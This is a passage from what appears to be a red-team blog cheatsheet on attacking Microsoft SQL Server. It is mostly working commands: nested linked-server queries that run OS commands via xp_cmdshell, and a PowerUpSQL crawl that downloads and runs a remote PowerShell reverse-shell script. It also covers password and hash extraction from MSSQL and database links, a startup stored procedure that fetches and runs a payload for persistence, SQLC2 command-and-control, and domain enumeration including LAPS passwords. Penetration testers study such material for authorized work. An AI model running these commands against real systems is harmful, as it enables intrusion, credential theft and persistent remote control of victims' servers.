</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Hereafter, a long example of openquery
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>openquery</span><span class=p>(</span><span class=s2>&#34;ops-mssql&#34;</span><span class=p>,</span><span class=s1>&#39;select * from openquery(&#34;opsfile&#34;,&#39;&#39;select * from openquery(&#34;ops-sqlsrvprod&#34;,&#39;&#39;&#39;&#39;select * from openquery(&#34;dps-sqlreport&#34;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;select * from openquery(&#34;dps-mssql&#34;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;select @@version as version;exec master..xp_cmdshell &#34;powershell whoami&#34;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;)&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;)&#39;&#39;&#39;&#39;)&#39;&#39;)&#39;</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><p><code>xp_cmdshell</code> cannot be enabled on linked databases unless rpcout is enabled for all links (disabled by default), <code>xp_cmdshell</code> can be enabled using:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1>-- The query travels through the links and executes at the instance specified by AT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>EXECUTE</span><span class=p>(</span><span class=s1>&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;reconfigure;&#39;</span><span class=p>)</span><span class=w> </span><span class=k>AT</span><span class=w> </span><span class=s2>&#34;SQLServer2&#34;</span><span class=w>
</span></span></span></code></pre></div><p>From the initial SQL server, OS commands can be executed using nested link queries (<strong>remember to double nested single quotes for escaping</strong>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>openquery</span><span class=p>(</span><span class=s2>&#34;SQLServer2&#34;</span><span class=p>,</span><span class=s1>&#39;select * from openquery(&#34;SQLServer3&#34;,&#39;&#39;select * from openquery(&#34;SQLServer4&#34;,&#39;&#39;&#39;&#39;select @@version as version;exec master..xp_cmdshell &#34;cmd /c calc.exe&#34;&#39;&#39;&#39;&#39;)&#39;&#39;)&#39;</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div></li><li><p><code>PowerUpSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Look for links to remote servers (public privs are enough)</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerLink</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Enumerate database links. PowerUpSQL saves us from managing these pesky quotes: </span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerLinkCrawl</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Execute the query on each server along the link</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerLinkCrawl</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Query</span> <span class=s2>&#34;exec master..xp_cmdshell &#39;cmd /c calc.exe&#39;&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerLinkCrawl</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Query</span> <span class=s2>&#34;exec master..xp_cmdshell &#39;cmd /c calc.exe&#39;&#34;</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=nb>select </span><span class=n>Instance</span><span class=p>,</span><span class=n>CustomQuery</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerLinkCrawl</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Query</span> <span class=s1>&#39;exec master..xp_cmdshell &#34;powershell iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.100.X:8080/InvokePowerShellTcpEx.ps1&#39;&#39;)&#34;&#39;</span>
</span></span></code></pre></div></li><li><p><code>NetSPI Powershell Modules</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Extracting passwords from MSSQL instances</span>
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=p>.\</span><span class=nb>Get-MSSQLCredentialPasswords</span><span class=p>.</span><span class=py>psm1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-MSSQLCredentialPasswords</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Extracting passwords from database links</span>
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=p>.\</span><span class=nb>Get-MSSQLLinkPasswords</span><span class=p>.</span><span class=py>psm1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-MSSQLLinkPasswords</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Extracting all MSSQL passwords</span>
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=p>.\</span><span class=nb>Get-MSSQLAllCredentials</span><span class=p>.</span><span class=py>psm1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-MSSQLAllCredentials</span>
</span></span></code></pre></div></li></ul><h2 id=persistence>Persistence</h2><h3 id=sql-login-pw-hash-dumping>SQL Login PW Hash Dumping</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># Returns logins from target SQL Servers</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerPasswordHash</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=p>|</span> <span class=nb>ft </span><span class=n>-AutoSize</span>
</span></span></code></pre></div><h3 id=startup-stored-procedures>Startup Stored Procedures</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1>-- Create a stored procedure (assuming xp_cmdshell is already enabled)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>USE</span><span class=w> </span><span class=n>master</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>CREATE</span><span class=w> </span><span class=k>PROCEDURE</span><span class=w> </span><span class=n>sp_autops</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>AS</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;powershell -C &#34;iex (new-object System.Net.WebClient).DownloadString(&#39;&#39;http://webserver/payload.ps1&#39;&#39;)&#34;&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Mark the stored procedure for automatic execution 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_procoption</span><span class=w> </span><span class=o>@</span><span class=n>ProcName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;sp_autops&#39;</span><span class=p>,</span><span class=w> </span><span class=o>@</span><span class=n>OptionName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;startup&#39;</span><span class=p>,</span><span class=w> </span><span class=o>@</span><span class=n>OptionValue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;on&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- To list stored procedures marked for automatic execution 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=p>[</span><span class=n>name</span><span class=p>]</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sysobjects</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;P&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=n>OBJECTPROPERTY</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;ExecIsStartUp&#39;</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>Reference:</p><ul><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql target=_blank rel=noopener>https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql</a></li><li><a href=https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ target=_blank rel=noopener>https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></li></ul><h3 id=triggers>Triggers</h3><p>A trigger is a special kind of stored procedure that automatically executes when an event occurs in the SQL Server.</p><p>Reference: <a href=https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql target=_blank rel=noopener>https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql</a></p><ul><li><p>DDL triggers:</p><p>Reference:</p><ul><li><a href=https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ target=_blank rel=noopener>https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></li><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers target=_blank rel=noopener>https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers</a></li><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups target=_blank rel=noopener>https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups</a></li></ul></li><li><p>DML triggers:</p><p>Reference:</p><ul><li><a href=https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ target=_blank rel=noopener>https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></li><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers target=_blank rel=noopener>https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers</a></li></ul></li><li><p>Logon triggers:</p><p>Reference:</p><ul><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers target=_blank rel=noopener>https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers</a></li></ul></li></ul><h3 id=registry>Registry</h3><p>References:</p><ul><li><a href=https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-isdenied-error-message-when-a-query-cal target=_blank rel=noopener>https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-isdenied-error-message-when-a-query-cal</a></li><li><a href=https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/ target=_blank rel=noopener>https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</a></li></ul><h3 id=sqlc2>SQLC2</h3><p>This is a csharp assembly; can be imported into SQL Server and used for basic post exploitation.</p><h4 id=sqlc2--installing-server>SQLC2 – Installing Server</h4><p>This functions creates the C2 SQL Server tables in the target database. If the database does not exist, the script will try to create it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># SQLC2</span>
</span></span><span class=line><span class=cl><span class=nb>Install-SQLC2Server</span> <span class=n>-Username</span> <span class=s1>&#39;CloudAdmin&#39;</span> <span class=n>-Password</span> <span class=s1>&#39;CloudPassword!&#39;</span> <span class=n>-Instance</span> <span class=s1>&#39;cloudserver1.database.windows.net&#39;</span> <span class=n>-Database</span> <span class=s1>&#39;database1&#39;</span>
</span></span></code></pre></div><h4 id=sqlc2--installing-psagent>SQLC2 – Installing PsAgent</h4><p>This functions installs a C2 Agent on the target SQL Server by creating a server link to the C2 SQL Server, then it creates a TSQL SQL Agent job that uses the link to download commands from the C2 server and executes them. By default is execute OS command using xp_cmdshell. This requires sysadmin privileges on the target server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># SQLC2</span>
</span></span><span class=line><span class=cl><span class=nb>Install-SQLC2AgentPs</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s1>&#39;SQLServer1&#39;</span> <span class=n>-Database</span> <span class=s1>&#39;test1&#39;</span>
</span></span></code></pre></div><h4 id=sqlc2--command--control>SQLC2 – Command & Control</h4><p>View SQLC2 Agents:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># SQLC2</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLC2Agent</span> <span class=n>-Verbose</span> <span class=n>-Username</span> <span class=s1>&#39;CloudAdmin&#39;</span> <span class=n>-Password</span> <span class=s1>&#39;CloudPassword!&#39;</span> <span class=n>-Instance</span> <span class=s1>&#39;cloudserver1.database.windows.net&#39;</span> <span class=n>-Database</span> <span class=s1>&#39;database1&#39;</span>
</span></span></code></pre></div><p>Set command to run on agent:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># SQLC2</span>
</span></span><span class=line><span class=cl><span class=nb>Set-SQLC2Command</span> <span class=n>-Verbose</span> <span class=n>-Username</span> <span class=s1>&#39;CloudAdmin&#39;</span> <span class=n>-Password</span> <span class=s1>&#39;CloudPassword!&#39;</span> <span class=n>-Instance</span> <span class=s1>&#39;cloudserver1.database.windows.net&#39;</span> <span class=n>-Database</span> <span class=s1>&#39;database1&#39;</span> <span class=n>-Command</span> <span class=s2>&#34;Whoami&#34;</span> <span class=n>-ServerName</span> <span class=s2>&#34;SQLServer1&#34;</span>
</span></span></code></pre></div><p>Get command results:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># SQLC2</span>
</span></span><span class=line><span class=cl><span class=nb>Set-SQLC2Command</span> <span class=n>-Verbose</span> <span class=n>-Username</span> <span class=s1>&#39;CloudAdmin&#39;</span> <span class=n>-Password</span> <span class=s1>&#39;CloudPassword!&#39;</span> <span class=n>-Instance</span> <span class=s1>&#39;cloudserver1.database.windows.net&#39;</span> <span class=n>-Database</span> <span class=s1>&#39;database1&#39;</span>
</span></span></code></pre></div><h2 id=active-directory-enumeration>Active Directory Enumeration</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># Provides the domain account policy for the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainAccountPolicy</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainAccountPolicy</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainAccountPolicy</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span> <span class=n>-LinkUsername</span> <span class=s2>&#34;domain\user&#34;</span> <span class=n>-LinkPassword</span> <span class=s2>&#34;Password123!&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceLocal</span> <span class=p>|</span> <span class=nb>Get-SQLDomainAccountPolicy</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceRemote</span> <span class=p>|</span> <span class=nb>Get-SQLDomainAccountPolicy</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain computers on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainComputer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain controllers on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainController</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the potential exploitable computers on the SQL Server&#39;s domain based on Operating System version information.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainExploitableSystem</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain groups on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainGroup</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain group members on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainGroupMember</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Can be used to execute arbitrary LDAP queries on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainObject</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the organization units on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainOu</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the local administrator password on the SQL Server&#39;s domain. This typically required Domain Admin privileges.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainPasswordsLAPS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of sites.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainSite</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of subnets.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainSubnet</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of domain trusts.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainTrust</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the disabled domain users on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>Disabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the enabled domain users on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>Enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the locked domain users on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>Locked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users that do not require Kerberos preauthentication on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>PreAuthNotRequired</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># This parameter can be used to list users that have not change their password in the last 90 days. Any number can be provided though.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>PwLastSet</span> <span class=mf>90</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users that never expire on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>PwNeverExpires</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users with the PASSWD_NOTREQD flag set on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>PwNotRequired</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users storing their password using reversible encryption on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>PwStoredRevEnc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users that require smart card for interactive login on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>SmartCardRequired</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users trusted for delegation on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>TrustedForDelegation</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Provides a list of the domain users trusted to authenticate for delegation on the SQL Server&#39;s domain.</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLDomainUser</span> <span class=n>-UserState</span> <span class=n>TrustedToAuthForDelegation</span>
</span></span></code></pre></div><h2 id=tools>Tools</h2><ul><li><a href=https://github.com/netspi/PowerUpSQL target=_blank rel=noopener>PowerUpSQL</a></li><li><a href=https://github.com/NetSPI/SQLC2 target=_blank rel=noopener>SQLC2</a></li><li><a href=https://github.com/NetSPI/Powershell-Modules target=_blank rel=noopener>NetSPI Powershell-Modules</a></li><li><a href=https://www.heidisql.com/ target=_blank rel=noopener>HeidiSQL</a></li><li><a href=https://github.com/samratashok/nishang target=_blank rel=noopener>Nishang</a></li></ul><h1 id=references>References</h1><ul><li><a href=https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet target=_blank rel=noopener>PowerUpSQL Cheatsheet</a></li><li><a href=https://blog.netspi.com/blindly-discover-sql-server-instances-powerupsql/ target=_blank rel=noopener>Blindly discover SQL Server instances - PowerUpSQL</a></li><li><a href=https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domainaccounts/ target=_blank rel=noopener>Enumerating domain accounts - PowerUpSQL</a></li><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-databaserole-members-transact-sql target=_blank rel=noopener>SQL database role members</a></li><li><a href=https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql target=_blank rel=noopener>EXECUTE AS</a></li><li><a href=https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ target=_blank rel=noopener>Hacking SQL Server stored procedures for user impersonation</a></li><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property target=_blank rel=noopener>Trustworthy database - 1</a></li><li><a href=http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/ target=_blank rel=noopener>Trustworthy database - 2</a></li><li><a href=http://www.sqlservercentral.com/articles/Security/121178/ target=_blank rel=noopener>Trustworthy database - 3</a></li><li><a href=https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-throughsql-server target=_blank rel=noopener>XP_CMDSHELL</a></li><li><a href=https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions target=_blank rel=noopener>Active Directory Recon functions</a></li><li><a href=https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-serversdatabase-engine target=_blank rel=noopener>SQL Linked Servers</a></li><li><a href=http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html target=_blank rel=noopener>Using SQL Server for attacking forest trusts</a></li><li><a href=https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/ target=_blank rel=noopener>Decrypting database link server passwords</a></li></ul><hr></div><div class=article-tags><a class="badge badge-light" href=/tag/red-teaming/>Red Teaming</a>
<a class="badge badge-light" href=/tag/windows/>Windows</a>
<a class="badge badge-light" href=/tag/active-directory/>Active Directory</a>
<a class="badge badge-light" href=/tag/mssql/>MSSQL</a></div><div class=share-box><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0070-mssql-cheatsheet%2F&amp;text=Microsoft+SQL+Server+cheatsheet" target=_blank rel=noopener class=share-btn-twitter aria-label=twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0070-mssql-cheatsheet%2F&amp;t=Microsoft+SQL+Server+cheatsheet" target=_blank rel=noopener class=share-btn-facebook aria-label=facebook><i class="fab fa-facebook"></i></a></li><li><a href="mailto:?subject=Microsoft%20SQL%20Server%20cheatsheet&amp;body=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0070-mssql-cheatsheet%2F" target=_blank rel=noopener class=share-btn-email aria-label=envelope><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0070-mssql-cheatsheet%2F&amp;title=Microsoft+SQL+Server+cheatsheet" target=_blank rel=noopener class=share-btn-linkedin aria-label=linkedin-in><i class="fab fa-linkedin-in"></i></a></li><li><a href="whatsapp://send?text=Microsoft+SQL+Server+cheatsheet%20https%3A%2F%2Fwww.peco602.com%2Fpost%2F0070-mssql-cheatsheet%2F" target=_blank rel=noopener class=share-btn-whatsapp aria-label=whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0070-mssql-cheatsheet%2F&amp;title=Microsoft+SQL+Server+cheatsheet" target=_blank rel=noopener class=share-btn-weibo aria-label=weibo><i class="fab fa-weibo"></i></a></li></ul></div><div class="media author-card content-widget-hr"><a href=https://www.peco602.com/><img class="avatar mr-3 avatar-circle" src=/authors/admin/avatar_huf4f2a9d771509e6e0b947acc7d389632_627121_270x270_fill_q75_lanczos_center.jpg alt="Giovanni Pecoraro"></a><div class=media-body><h5 class=card-title><a href=https://www.peco602.com/>Giovanni Pecoraro</a></h5><h6 class=card-subtitle>Senior Security Engineer</h6><p class=card-text>My research interests include space systems, cyber security, signal processing and artificial intelligence.</p><ul class=network-icon aria-hidden=true><li><a href=/#contact><i class="fas fa-envelope"></i></a></li><li><a href=https://twitter.com/Peco602 target=_blank rel=noopener><i class="fab fa-twitter"></i></a></li><li><a href="https://scholar.google.com/citations?user=JSM2EcoAAAAJ" target=_blank rel=noopener><i class="ai ai-google-scholar"></i></a></li><li><a href=https://www.researchgate.net/profile/Giovanni-Pecoraro target=_blank rel=noopener><i class="fab fa-researchgate"></i></a></li><li><a href=https://github.com/Peco602 target=_blank rel=noopener><i class="fab fa-github"></i></a></li><li><a href=https://it.linkedin.com/in/giovanni-pecoraro-078500155 target=_blank rel=noopener><i class="fab fa-linkedin"></i></a></li><li><a href=/uploads/resume.pdf><i class="ai ai-cv"></i></a></li></ul></div></div><script src=https://utteranc.es/client.js repo=Peco602/peco602.github.io issue-term=pathname label=comment theme=github-light crossorigin=anonymous async></script></div></article></div><div class=page-footer><div class=container><footer class=site-footer><p class="powered-by copyright-license-text">© 2023 Me. This work is licensed under <a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank>CC BY NC ND 4.0</a></p><p class="powered-by footer-license-icons"><a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank aria-label="Creative Commons"><i class="fab fa-creative-commons fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-by fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nc fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nd fa-2x" aria-hidden=true></i></a></p><p class=powered-by>Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target=_blank rel=noopener>Wowchemy</a> — the free, <a href=https://github.com/wowchemy/wowchemy-hugo-themes target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></div><script src=/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js></script>
<script id=search-hit-fuse-template type=text/x-template>
    <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
    </div>
  </script><script src=https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin=anonymous></script>
